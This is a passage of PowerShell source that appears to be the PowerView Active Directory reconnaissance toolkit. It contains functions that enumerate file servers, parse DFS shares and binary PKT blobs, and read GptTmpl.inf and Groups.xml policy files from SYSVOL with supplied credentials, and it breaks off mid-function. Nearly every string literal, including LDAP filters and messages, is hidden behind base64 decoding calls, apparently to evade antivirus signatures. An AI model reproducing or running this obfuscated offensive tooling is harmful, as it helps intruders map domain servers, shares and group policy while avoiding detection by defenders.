        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        function Split-Path {
            
            Param([String]$Path)

            if ($Path -and ($Path.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw=")))).Count -ge 3)) {
                $Temp = $Path.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))))[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }

        $SearcherArguments = @{
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY4KSghKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0yKSkofChob21lZGlyZWN0b3J5PSopKHNjcmlwdHBhdGg9KikocHJvZmlsZXBhdGg9KikpKQ==")))
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aG9tZWRpcmVjdG9yeSxzY3JpcHRwYXRoLHByb2ZpbGVwYXRo")))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $TargetDomain
                $UserSearcher = Get-DomainSearcher @SearcherArguments
                
                $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aG9tZWRpcmVjdG9yeQ==")))]) {Split-Path($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aG9tZWRpcmVjdG9yeQ==")))])}if ($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2NyaXB0cGF0aA==")))]) {Split-Path($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2NyaXB0cGF0aA==")))])}if ($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cHJvZmlsZXBhdGg=")))]) {Split-Path($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cHJvZmlsZXBhdGg=")))])}}) | Sort-Object -Unique
            }
        }
        else {
            $UserSearcher = Get-DomainSearcher @SearcherArguments
            $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aG9tZWRpcmVjdG9yeQ==")))]) {Split-Path($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aG9tZWRpcmVjdG9yeQ==")))])}if ($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2NyaXB0cGF0aA==")))]) {Split-Path($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2NyaXB0cGF0aA==")))])}if ($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cHJvZmlsZXBhdGg=")))]) {Split-Path($UserResult.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cHJvZmlsZXBhdGg=")))])}}) | Sort-Object -Unique
        }
    }
}


function Get-DomainDFSShare {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $Version = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxs")))
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        function Parse-Pkt {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Pkt
            )

            $bin = $Pkt
            $blob_version = [bitconverter]::ToUInt32($bin[0..3],0)
            $blob_element_count = [bitconverter]::ToUInt32($bin[4..7],0)
            $offset = 8
            
            $object_list = @()
            for($i=1; $i -le $blob_element_count; $i++){
                $blob_name_size_start = $offset
                $blob_name_size_end = $offset + 1
                $blob_name_size = [bitconverter]::ToUInt16($bin[$blob_name_size_start..$blob_name_size_end],0)

                $blob_name_start = $blob_name_size_end + 1
                $blob_name_end = $blob_name_start + $blob_name_size - 1
                $blob_name = [System.Text.Encoding]::Unicode.GetString($bin[$blob_name_start..$blob_name_end])

                $blob_data_size_start = $blob_name_end + 1
                $blob_data_size_end = $blob_data_size_start + 3
                $blob_data_size = [bitconverter]::ToUInt32($bin[$blob_data_size_start..$blob_data_size_end],0)

                $blob_data_start = $blob_data_size_end + 1
                $blob_data_end = $blob_data_start + $blob_data_size - 1
                $blob_data = $bin[$blob_data_start..$blob_data_end]
                switch -wildcard ($blob_name) {
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XHNpdGVyb290"))) {  }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XGRvbWFpbnJvb3Qq"))) {
                        
                        
                        $root_or_link_guid_start = 0
                        $root_or_link_guid_end = 15
                        $root_or_link_guid = [byte[]]$blob_data[$root_or_link_guid_start..$root_or_link_guid_end]
                        $guid = New-Object Guid(,$root_or_link_guid) 
                        $prefix_size_start = $root_or_link_guid_end + 1
                        $prefix_size_end = $prefix_size_start + 1
                        $prefix_size = [bitconverter]::ToUInt16($blob_data[$prefix_size_start..$prefix_size_end],0)
                        $prefix_start = $prefix_size_end + 1
                        $prefix_end = $prefix_start + $prefix_size - 1
                        $prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$prefix_start..$prefix_end])

                        $short_prefix_size_start = $prefix_end + 1
                        $short_prefix_size_end = $short_prefix_size_start + 1
                        $short_prefix_size = [bitconverter]::ToUInt16($blob_data[$short_prefix_size_start..$short_prefix_size_end],0)
                        $short_prefix_start = $short_prefix_size_end + 1
                        $short_prefix_end = $short_prefix_start + $short_prefix_size - 1
                        $short_prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$short_prefix_start..$short_prefix_end])

                        $type_start = $short_prefix_end + 1
                        $type_end = $type_start + 3
                        $type = [bitconverter]::ToUInt32($blob_data[$type_start..$type_end],0)

                        $state_start = $type_end + 1
                        $state_end = $state_start + 3
                        $state = [bitconverter]::ToUInt32($blob_data[$state_start..$state_end],0)

                        $comment_size_start = $state_end + 1
                        $comment_size_end = $comment_size_start + 1
                        $comment_size = [bitconverter]::ToUInt16($blob_data[$comment_size_start..$comment_size_end],0)
                        $comment_start = $comment_size_end + 1
                        $comment_end = $comment_start + $comment_size - 1
                        if ($comment_size -gt 0)  {
                            $comment = [System.Text.Encoding]::Unicode.GetString($blob_data[$comment_start..$comment_end])
                        }
                        $prefix_timestamp_start = $comment_end + 1
                        $prefix_timestamp_end = $prefix_timestamp_start + 7
                        
                        $prefix_timestamp = $blob_data[$prefix_timestamp_start..$prefix_timestamp_end] 
                        $state_timestamp_start = $prefix_timestamp_end + 1
                        $state_timestamp_end = $state_timestamp_start + 7
                        $state_timestamp = $blob_data[$state_timestamp_start..$state_timestamp_end]
                        $comment_timestamp_start = $state_timestamp_end + 1
                        $comment_timestamp_end = $comment_timestamp_start + 7
                        $comment_timestamp = $blob_data[$comment_timestamp_start..$comment_timestamp_end]
                        $version_start = $comment_timestamp_end  + 1
                        $version_end = $version_start + 3
                        $version = [bitconverter]::ToUInt32($blob_data[$version_start..$version_end],0)

                        
                        $dfs_targetlist_blob_size_start = $version_end + 1
                        $dfs_targetlist_blob_size_end = $dfs_targetlist_blob_size_start + 3
                        $dfs_targetlist_blob_size = [bitconverter]::ToUInt32($blob_data[$dfs_targetlist_blob_size_start..$dfs_targetlist_blob_size_end],0)

                        $dfs_targetlist_blob_start = $dfs_targetlist_blob_size_end + 1
                        $dfs_targetlist_blob_end = $dfs_targetlist_blob_start + $dfs_targetlist_blob_size - 1
                        $dfs_targetlist_blob = $blob_data[$dfs_targetlist_blob_start..$dfs_targetlist_blob_end]
                        $reserved_blob_size_start = $dfs_targetlist_blob_end + 1
                        $reserved_blob_size_end = $reserved_blob_size_start + 3
                        $reserved_blob_size = [bitconverter]::ToUInt32($blob_data[$reserved_blob_size_start..$reserved_blob_size_end],0)

                        $reserved_blob_start = $reserved_blob_size_end + 1
                        $reserved_blob_end = $reserved_blob_start + $reserved_blob_size - 1
                        $reserved_blob = $blob_data[$reserved_blob_start..$reserved_blob_end]
                        $referral_ttl_start = $reserved_blob_end + 1
                        $referral_ttl_end = $referral_ttl_start + 3
                        $referral_ttl = [bitconverter]::ToUInt32($blob_data[$referral_ttl_start..$referral_ttl_end],0)

                        
                        $target_count_start = 0
                        $target_count_end = $target_count_start + 3
                        $target_count = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_count_start..$target_count_end],0)
                        $t_offset = $target_count_end + 1

                        for($j=1; $j -le $target_count; $j++){
                            $target_entry_size_start = $t_offset
                            $target_entry_size_end = $target_entry_size_start + 3
                            $target_entry_size = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_entry_size_start..$target_entry_size_end],0)
                            $target_time_stamp_start = $target_entry_size_end + 1
                            $target_time_stamp_end = $target_time_stamp_start + 7
                            
                            $target_time_stamp = $dfs_targetlist_blob[$target_time_stamp_start..$target_time_stamp_end]
                            $target_state_start = $target_time_stamp_end + 1
                            $target_state_end = $target_state_start + 3
                            $target_state = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_state_start..$target_state_end],0)

                            $target_type_start = $target_state_end + 1
                            $target_type_end = $target_type_start + 3
                            $target_type = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_type_start..$target_type_end],0)

                            $server_name_size_start = $target_type_end + 1
                            $server_name_size_end = $server_name_size_start + 1
                            $server_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$server_name_size_start..$server_name_size_end],0)

                            $server_name_start = $server_name_size_end + 1
                            $server_name_end = $server_name_start + $server_name_size - 1
                            $server_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$server_name_start..$server_name_end])

                            $share_name_size_start = $server_name_end + 1
                            $share_name_size_end = $share_name_size_start + 1
                            $share_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$share_name_size_start..$share_name_size_end],0)
                            $share_name_start = $share_name_size_end + 1
                            $share_name_end = $share_name_start + $share_name_size - 1
                            $share_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$share_name_start..$share_name_end])

                            $target_list += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFwkc2VydmVyX25hbWVcJHNoYXJlX25hbWU=")))
                            $t_offset = $share_name_end + 1
                        }
                    }
                }
                $offset = $blob_data_end + 1
                $dfs_pkt_properties = @{
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZQ=="))) = $blob_name
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJlZml4"))) = $prefix
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0TGlzdA=="))) = $target_list
                }
                $object_list += New-Object -TypeName PSObject -Property $dfs_pkt_properties
                $prefix = $Null
                $blob_name = $Null
                $target_list = $Null
            }

            $servers = @()
            $object_list | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $servers += $_.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[2]
                    }
                }
            }

            $servers
        }

        function Get-DomainDFSShareV1 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,

                [String]
                $SearchBase,

                [String]
                $Server,

                [String]
                $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

                [Int]
                $ResultPageSize = 200,

                [Int]
                $ServerTimeLimit,

                [Switch]
                $Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )

            $DFSsearcher = Get-DomainSearcher @PSBoundParameters

            if ($DFSsearcher) {
                $DFSshares = @()
                $DFSsearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2xhc3M9ZlREZnMpKQ==")))

                try {
                    $Results = $DFSSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        $Properties = $_.Properties
                        $RemoteNames = $Properties.remoteservername
                        $Pkt = $Properties.pkt

                        $DFSshares += $RemoteNames | ForEach-Object {
                            try {
                                if ( $_.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA==")))) ) {
                                    New-Object -TypeName PSObject -Property @{([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZQ==")))=$Properties.name[0];([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlU2VydmVyTmFtZQ==")))=$_.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[2]}
                                }
                            }
                            catch {
                                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ERlNTaGFyZV0gR2V0LURvbWFpbkRGU1NoYXJlVjEgZXJyb3IgaW4gcGFyc2luZyBERlMgc2hhcmUgOiB7MH0="))) -f $_)
                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ERlNTaGFyZV0gR2V0LURvbWFpbkRGU1NoYXJlVjEgZXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogezB9"))) -f $_)
                        }
                    }
                    $DFSSearcher.dispose()

                    if ($pkt -and $pkt[0]) {
                        Parse-Pkt $pkt[0] | ForEach-Object {
                            
                            
                            
                            if ($_ -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bnVsbA==")))) {
                                New-Object -TypeName PSObject -Property @{([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZQ==")))=$Properties.name[0];([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlU2VydmVyTmFtZQ==")))=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ERlNTaGFyZV0gR2V0LURvbWFpbkRGU1NoYXJlVjEgZXJyb3IgOiB7MH0="))) -f $_)
                }
                $DFSshares | Sort-Object -Unique -Property ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlU2VydmVyTmFtZQ==")))
            }
        }

        function Get-DomainDFSShareV2 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,

                [String]
                $SearchBase,

                [String]
                $Server,

                [String]
                $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

                [Int]
                $ResultPageSize = 200,

                [Int]
                $ServerTimeLimit,

                [Switch]
                $Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )

            $DFSsearcher = Get-DomainSearcher @PSBoundParameters

            if ($DFSsearcher) {
                $DFSshares = @()
                $DFSsearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2xhc3M9bXNERlMtTGlua3YyKSk=")))
                $Null = $DFSSearcher.PropertiesToLoad.AddRange((([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkZnMtbGlua3BhdGh2Mg=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNERlMtVGFyZ2V0TGlzdHYy")))))

                try {
                    $Results = $DFSSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        $Properties = $_.Properties
                        $target_list = $Properties.([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkZnMtdGFyZ2V0bGlzdHYy")))[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])
                        $DFSshares += $xml.targets.ChildNodes | ForEach-Object {
                            try {
                                $Target = $_.InnerText
                                if ( $Target.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA==")))) ) {
                                    $DFSroot = $Target.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[3]
                                    $ShareName = $Properties.([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkZnMtbGlua3BhdGh2Mg==")))[0]
                                    New-Object -TypeName PSObject -Property @{([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZQ==")))=([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JERGU3Jvb3QkU2hhcmVOYW1l")));([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlU2VydmVyTmFtZQ==")))=$Target.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[2]}
                                }
                            }
                            catch {
                                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ERlNTaGFyZV0gR2V0LURvbWFpbkRGU1NoYXJlVjIgZXJyb3IgaW4gcGFyc2luZyB0YXJnZXQgOiB7MH0="))) -f $_)
                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ERlNTaGFyZV0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogezB9"))) -f $_)
                        }
                    }
                    $DFSSearcher.dispose()
                }
                catch {
                    Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ERlNTaGFyZV0gR2V0LURvbWFpbkRGU1NoYXJlVjIgZXJyb3IgOiB7MH0="))) -f $_)
                }
                $DFSshares | Sort-Object -Unique -Property ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlU2VydmVyTmFtZQ==")))
            }
        }
    }

    PROCESS {
        $DFSshares = @()

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $TargetDomain
                if ($Version -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWxsfDE=")))) {
                    $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
                }
                if ($Version -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWxsfDI=")))) {
                    $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
                }
            }
        }
        else {
            if ($Version -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWxsfDE=")))) {
                $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
            }
            if ($Version -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWxsfDI=")))) {
                $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
            }
        }

        $DFSshares | Sort-Object -Property (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlU2VydmVyTmFtZQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZQ==")))) -Unique
    }
}








function Get-GptTmpl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        $GptTmplPath,

        [Switch]
        $OutputObject,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $MappedPaths = @{}
    }

    PROCESS {
        try {
            if (($GptTmplPath -Match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFxcXC4qXFwuKg==")))) -and ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))])) {
                $SysVolPath = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFx7MH1cU1lTVk9M"))) -f $((New-Object System.Uri($GptTmplPath)).Host))
                if (-not $MappedPaths[$SysVolPath]) {
                    
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }

            $TargetGptTmplPath = $GptTmplPath
            if (-not $TargetGptTmplPath.EndsWith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LmluZg=="))))) {
                $TargetGptTmplPath += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XE1BQ0hJTkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcU2VjRWRpdFxHcHRUbXBsLmluZg==")))
            }

            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1HcHRUbXBsXSBQYXJzaW5nIEdwdFRtcGxQYXRoOiAkVGFyZ2V0R3B0VG1wbFBhdGg=")))

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0cHV0T2JqZWN0")))]) {
                $Contents = Get-IniContent -Path $TargetGptTmplPath -OutputObject -ErrorAction Stop
                if ($Contents) {
                    $Contents | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGF0aA=="))) $TargetGptTmplPath
                    $Contents
                }
            }
            else {
                $Contents = Get-IniContent -Path $TargetGptTmplPath -ErrorAction Stop
                if ($Contents) {
                    $Contents[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGF0aA==")))] = $TargetGptTmplPath
                    $Contents
                }
            }
        }
        catch {
            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1HcHRUbXBsXSBFcnJvciBwYXJzaW5nICRUYXJnZXRHcHRUbXBsUGF0aCA6IHswfQ=="))) -f $_)
        }
    }

    END {
        
        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}


function Get-GroupsXML {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $GroupsXMLPath,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $MappedPaths = @{}
    }

    PROCESS {
        try {
            if (($GroupsXMLPath -Match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFxcXC4qXFwuKg==")))) -and ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))])) {
                $SysVolPath = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFx7MH1cU1lTVk9M"))) -f $((New-Object System.Uri($GroupsXMLPath)).Host))
                if (-not $MappedPaths[$SysVolPath]) {
                    
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }

            [XML]$GroupsXMLcontent = Get-Content -Path $GroupsXMLPath -ErrorAction Stop

            
            $GroupsXMLcontent | Select-Xml ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("L0dyb3Vwcy9Hcm91cA=="))) | Select-Object -ExpandProperty node | ForEach-Object {

                $Groupname = $_.Properties.groupName

                
                $GroupSID = $_.Properties.groupSid
                if (-not $GroupSID) {
                    if ($Groupname -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5pc3RyYXRvcnM=")))) {
